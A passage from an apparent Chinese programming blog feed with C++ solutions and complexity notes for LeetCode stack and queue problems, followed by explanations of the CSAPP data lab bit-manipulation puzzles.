res = que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.<span class="built_in">back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack* obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) pop()</li>
<li>空间复杂度：O(n) 队列</li>
</ul>
<h1 id="4-leetcode-20-有效括号-E"><a href="#4-leetcode-20-有效括号-E" class="headerlink" title="4.leetcode-20-有效括号-E"></a>4.leetcode-20-有效括号-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/valid-parentheses/description/">20. 有效的括号 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>三种情况：左边括号多了，两个括号不匹配，右边括号多了<ul>
<li>第一种：<ul>
<li>栈中push进与之匹配的括号 然后遇到相同则消除</li>
<li>字符串遍历完 栈不为空 多了</li>
</ul>
</li>
<li>第二种：<ul>
<li>栈顶元素与遍历的不匹配</li>
</ul>
</li>
<li>第三种：<ul>
<li>字符串还没有遍历完 栈已经为空了 右边括号多了</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//剪枝</span></span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">size</span>() % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c: s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;(&#x27;</span>) st.<span class="built_in">push</span>(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) st.<span class="built_in">push</span>(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;[&#x27;</span>) st.<span class="built_in">push</span>(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="comment">//栈已经为空了</span></span><br><span class="line">            <span class="comment">//没有找到匹配的字符</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (st.<span class="built_in">empty</span>() || st.<span class="built_in">top</span>() != c) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">else</span> st.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> st.<span class="built_in">empty</span>();<span class="comment">//第一种情况 遍历完数组 但栈还有括号则st.empty()为false 否则为true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n)遍历字符串</li>
<li>空间复杂度：O(n) 栈</li>
</ul>
<h1 id="5-leetcode-1047-删除字符串钟的所有相邻重复项"><a href="#5-leetcode-1047-删除字符串钟的所有相邻重复项" class="headerlink" title="5.leetcode-1047-删除字符串钟的所有相邻重复项"></a>5.leetcode-1047-删除字符串钟的所有相邻重复项</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/remove-all-adjacent-duplicates-in-string/description/">1047. 删除字符串中的所有相邻重复项 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>删除两个相邻且相同的字母，删除它们</li>
<li>在字符串上反复执行删除操作</li>
<li>同上一样 只是push进去的是元素</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">removeDuplicates</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c: s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (st.<span class="built_in">empty</span>()) st.<span class="built_in">push</span>(c);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (st.<span class="built_in">top</span>() != c) st.<span class="built_in">push</span>(c);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (st.<span class="built_in">top</span>() == c) st.<span class="built_in">pop</span>();<span class="comment">//弹出元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            res += st.<span class="built_in">top</span>();<span class="comment">//从栈中取出字符存入返回字符串</span></span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());<span class="comment">//需要反转一下</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n)遍历字符串</li>
<li>空间复杂度：O(n)栈 和返回字符串</li>
</ul>
<h1 id="6-leetcode-150-逆波兰表达式求值-M"><a href="#6-leetcode-150-逆波兰表达式求值-M" class="headerlink" title="6.leetcode-150-逆波兰表达式求值-M"></a>6.leetcode-150-逆波兰表达式求值-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/evaluate-reverse-polish-notation/description/">150. 逆波兰表达式求值 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>逆波兰表达式： 后缀表达式：二叉树的后序遍历  更便于计算机理解。适合栈的操作</li>
<li>遇到两个元素 和 一个操作符 进行消除</li>
<li>栈：<strong>用于 相邻字符的操作</strong></li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">long</span> <span class="type">long</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; tokens.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;+&quot;</span> || tokens[i] == <span class="string">&quot;-&quot;</span> || tokens[i] == <span class="string">&quot;*&quot;</span> || tokens[i] == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> num1 = st.<span class="built_in">top</span>();<span class="comment">//取出数据</span></span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> num2 = st.<span class="built_in">top</span>();</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;+&quot;</span>) st.<span class="built_in">push</span>(num2 + num1);<span class="comment">//注意式num2 在前面 因为是栈先入后出  所以第一个数是num2</span></span><br><span class="line">                <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;-&quot;</span>) st.<span class="built_in">push</span>(num2 - num1);</span><br><span class="line">                <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;*&quot;</span>) st.<span class="built_in">push</span>(num2 * num1);</span><br><span class="line">                <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;/&quot;</span>) st.<span class="built_in">push</span>(num2 / num1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(<span class="built_in">stoll</span>(tokens[i]));<span class="comment">//stoll  string to long long 将字符串转换成长整型</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = st.<span class="built_in">top</span>();</span><br><span class="line">        st.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 遍历</li>
<li>空间复杂度：O(n)栈</li>
</ul>
<h1 id="7-leetcode-239-滑动窗口最大值-H"><a href="#7-leetcode-239-滑动窗口最大值-H" class="headerlink" title="7.leetcode-239-滑动窗口最大值-H"></a>7.leetcode-239-滑动窗口最大值-H</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/sliding-window-maximum/description/">239. 滑动窗口最大值 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>单调队列（双端队列） diy队列  只维护最大值就好  没有必要维护比最大值小的数 因为滑动窗口移动时 本身也会抛弃</li>
<li>deque 双向队列 两端都可以弹出和push</li>
<li>除了队首元素是从前面移除外，其他元素都是从后面移除</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">//自己定义了单调队列 基于deque的双向队列来实现</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        deque&lt;<span class="type">int</span>&gt; que;</span><br><span class="line">        <span class="comment">//每次弹出的时候，比较当前要弹出的数值是否等于队列出口的元素 相等则弹出。</span></span><br><span class="line">        <span class="comment">//pop之前判断队列是否为空</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">pop</span> <span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!que.<span class="built_in">empty</span>() &amp;&amp; val == que.<span class="built_in">front</span>()) &#123;</span><br><span class="line">                que.<span class="built_in">pop_front</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果push 的数值大于入口元素则 将队列后端的数值弹出，直到push的数值小于</span></span><br><span class="line">        <span class="comment">//队列入口元素的数值为止</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">push</span> <span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (!que.<span class="built_in">empty</span>() &amp;&amp; val &gt; que.<span class="built_in">back</span>()) &#123;</span><br><span class="line">                que.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            que.<span class="built_in">push_back</span>(val);<span class="comment">//从后端push</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//单调队列 返回队列前端</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">front</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> que.<span class="built_in">front</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxSlidingWindow</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        MyQueue que;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            que.<span class="built_in">push</span>(nums[i]);<span class="comment">//将前k个元素放入队列</span></span><br><span class="line">        &#125;</span><br><span class="line">        result.<span class="built_in">push_back</span>(que.<span class="built_in">front</span>());<span class="comment">//记录最大值 就是front</span></span><br><span class="line">        <span class="comment">//第k 到 n个</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            que.<span class="built_in">pop</span>(nums[i - k]);<span class="comment">//弹出失去时效的元素</span></span><br><span class="line">            que.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">            result.<span class="built_in">push_back</span>(que.<span class="built_in">front</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 循环遍历</li>
<li>空间复杂度：O(k) 队列que</li>
</ul>
<h1 id="8-leetcode-347-前k个高频元素-M"><a href="#8-leetcode-347-前k个高频元素-M" class="headerlink" title="8.leetcode-347-前k个高频元素-M"></a>8.leetcode-347-前k个高频元素-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/top-k-frequent-elements/description/">347. 前 K 个高频元素 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>统计出现频率–哈希表unordered_map  顺序排列 —优先队列 priority_queue</li>
<li>没有必要对所有元素进行排序，只需要对k个元素进行排序就可以—-大顶堆&#x2F;小顶堆（把小元素pop，堆里留留下的就是较大的元素）。</li>
<li><img src="/2023/10/10/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/image-20231019110029360.png" alt="image-20231019110029360"></li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//静态成员函数 用于比较两个pair 对象的第二个元素</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">cmp</span> <span class="params">(pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; m, pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&amp; n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m.second &gt; n.second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">topKFrequent</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num: nums) &#123;</span><br><span class="line">            map[num]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//小顶堆 使用了自定义比较函数 cmp</span></span><br><span class="line">        <span class="comment">//que 存储了pair&lt;int, int&gt;类型</span></span><br><span class="line">        <span class="comment">//vector&lt;pair&lt;int, int&gt;&gt; 底层容器的类型 即存储元素的容器类型</span></span><br><span class="line">        <span class="comment">//decltype 用于指定自定义比较函数的类型， decltype 用于获取cmp函数的类型 表示地址</span></span><br><span class="line">        <span class="comment">//que(cmp) 优先队列初始化时调用了自定义的比较函数 cmp</span></span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, <span class="keyword">decltype</span>(&amp;cmp)&gt; <span class="built_in">que</span>(cmp);</span><br><span class="line">        <span class="comment">//对map 进行遍历  小顶堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; [num, count] :map) &#123;</span><br><span class="line">            <span class="comment">//如果已经达到了k ，则比较栈顶元素出现次数和当前元素出现次数 若栈顶元素出现次数小于 当前元素 则弹出栈顶元素，并将当前元素加入栈中。</span></span><br><span class="line">            <span class="keyword">if</span> (que.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (que.<span class="built_in">top</span>().second &lt; count) &#123;</span><br><span class="line">                    que.<span class="built_in">pop</span>();</span><br><span class="line">                    que.<span class="built_in">emplace</span>(num, count);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                que.<span class="built_in">emplace</span>(num, count);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//放入返回数组中</span></span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(que.<span class="built_in">top</span>().first);</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n logk) 堆只维护了k个元素</li>
<li>空间复杂度：O(n) 哈希表</li>
</ul>
<p>^ </p>
]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>栈与队列</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-2-datalab</title>
    <url>/2023/10/18/CSAPP-2-datalab/</url>
    <content><![CDATA[<h2 id="2-data-lab"><a href="#2-data-lab" class="headerlink" title="2 data lab"></a>2 data lab</h2><h3 id="2-1-bitXor"><a href="#2-1-bitXor" class="headerlink" title="2.1 bitXor"></a>2.1 bitXor</h3><ul>
<li><p>x^y only use ~ and &amp;</p>
</li>
<li><p>异或：不相同时为1，相同为0——- 计算不是<strong>同时为0情况</strong>和不是<strong>同时为1的情况</strong> 然后进行与</p>
<ul>
<li>例如 x[0011]                        y[0101]</li>
<li><strong>找出同时为1的情况 则 x&amp;y &#x3D; [0001]</strong></li>
<li><strong>找出同时为0的情况 则相反 ~x[1100] &amp; ~y[1010] &#x3D; [1000]</strong></li>
<li>找出这两种单独情况然后再取非 按位与就是异或门实现</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ~(~x&amp;~y)&amp;~(x&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-2-tmin"><a href="#2-2-tmin" class="headerlink" title="2.2 tmin"></a>2.2 tmin</h3><ul>
<li><p>only use ！~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
</li>
<li><p>返回最小补码整数</p>
</li>
<li><p>题目要求机器在32位机器上运行  int的类型位32位</p>
</li>
<li><p>补码最小值为 符号位为1 其余为0 即为最小值，因此可以将0X1[00000000,00000000,00000000,00000001] 左移31位。</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">tmin</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-3-isTmax"><a href="#2-3-isTmax" class="headerlink" title="2.3 isTmax"></a>2.3 isTmax</h3><ul>
<li><p>当输入的数是最大时返回1，其余返回0.</p>
</li>
<li><p>only use <code>!（非）  ~（按位取反） &amp; ^ | +</code></p>
</li>
<li><p>int 32位最大值 符号位为0，其余为1 [01111111,11111111,11111111,11111111] 判断x是否和这个值相等</p>
</li>
<li><p>当Tmax 再增加1时 会变成[1000…..] Tmin </p>
</li>
<li><p>Tmin[1000] 恰好是Tmax[0111] 的反   <strong>除了x &#x3D; -1[1111] 和y &#x3D; 0[0000] 外 都不满足这个规则</strong>，利用[0000] 和[1000]的不相同  让结果直接加上它 </p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isTmax</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> y = x + <span class="number">1</span>;<span class="comment">//如果x是Tmax[0111] 则 y = Tmin[1000] </span></span><br><span class="line">    x = x + y;<span class="comment">//[1111]</span></span><br><span class="line">    x = ~x;<span class="comment">//[0000]</span></span><br><span class="line">    <span class="keyword">return</span> !（x + !y）; <span class="comment">//如果y=[0000] -&gt;!y=[0001] x + !y = [0001] 最后在取反返回0</span></span><br><span class="line">    				   <span class="comment">//如果y=[1000] -&gt;!y=[0000] x + !y = [0000] 返回1 对答案无影响</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-4-allOddBits"><a href="#2-4-allOddBits" class="headerlink" title="2.4 allOddBits"></a>2.4 allOddBits</h3><ul>
<li><p>如果所有的奇数位都位1 则返回1 [0-31]</p>
</li>
<li><p>only use ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
</li>
<li><p>利用 掩码  关键是 如何提取出x 的奇数位</p>
<ul>
<li>先构造一个 奇数位全为1 的数 即0xAAAAAAAA</li>
<li>任何数与这个数 &amp;后，偶数位全0，奇数位 1的仍然是1， 原来是0的则为0.。</li>
<li><strong>在与这个数[0xAAAAAAAA]进行异或，满足要求则数转换为0，不满足则非0。</strong></li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  	<span class="type">int</span> a = <span class="number">0xaa</span> + (<span class="number">0xaa</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  	<span class="type">int</span> b = a + (a &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  	<span class="keyword">return</span> !((x &amp; b) ^ b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-5-negate"><a href="#2-5-negate" class="headerlink" title="2.5 negate"></a>2.5 negate</h3><ul>
<li><p>求反</p>
</li>
<li><p>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
</li>
<li><p>1[0001]      -1[1111]  阿贝尔群 <strong>取反+1</strong></p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">negate</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (~x + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-6-isAsciiDigit"><a href="#2-6-isAsciiDigit" class="headerlink" title="2.6 isAsciiDigit"></a>2.6 isAsciiDigit</h3><ul>
<li><p>判断是否是ascii数字 0x30 &lt;&#x3D; x &lt;&#x3D;0x39</p>
</li>
<li><p><strong>又上题可得 ~x+1 &#x3D; - x</strong>，因此可以由这个实现减法运算  </p>
<ul>
<li>减去上下界。 上界[0x39] 下界[0x30]    然后再右移31位 判断符号位</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> upper = (<span class="number">0x39</span> + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;<span class="comment">//左移31</span></span><br><span class="line">  <span class="type">int</span> down = (x + (~<span class="number">0x30</span> + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !upper &amp; !down;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-7-conditional"><a href="#2-7-conditional" class="headerlink" title="2.7 conditional"></a>2.7 conditional</h3><ul>
<li><p><code>x ? y : z</code> 当<code>x 非0</code>时 返回<code> y</code> ，当<code>x = 0</code>时返回 <code>z </code></p>
<ul>
<li>利用<code>x=[0000]</code>（表示0，返回z的情况）时 或x &#x3D;[1111]（表示非0，返回y 的情况）</li>
<li><code>x =~x + 1</code>作用 设置为全0 或全1</li>
<li>例如 x一开始 [0000] 和 [0001]</li>
<li>经过~x 为 [1111] 和 [1110]</li>
<li>+1 为 [0000] 和 [1111]</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !!x;</span><br><span class="line">  x = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (x &amp; y) | (~x &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-8-isLessOrEqual"><a href="#2-8-isLessOrEqual" class="headerlink" title="2.8 isLessOrEqual"></a>2.8 isLessOrEqual</h3><ul>
<li><p>用位运算 实现 &lt;&#x3D;</p>
</li>
<li><p>比较两个数的大小  两种情况</p>
<ul>
<li>符号不同 整数大</li>
<li>符号相同 看差值符号</li>
</ul>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = x &gt;&gt; <span class="number">31</span>;<span class="comment">//取符号位</span></span><br><span class="line">  <span class="type">int</span> b = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> c = !(a ^ b);<span class="comment">//取非，保证相同为1，不同为0</span></span><br><span class="line">  <span class="type">int</span> d = !((y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>);<span class="comment">//取非保证：y &gt;= x 为1 y&lt;x 为0</span></span><br><span class="line">  <span class="keyword">return</span> (c&amp;d) | (!c&amp;a);<span class="comment">//左边条件：符号相等 则返回相减的符号位，右边条件： 符号不相等 若a&lt;0 返回1 &gt;0返回0</span></span><br><span 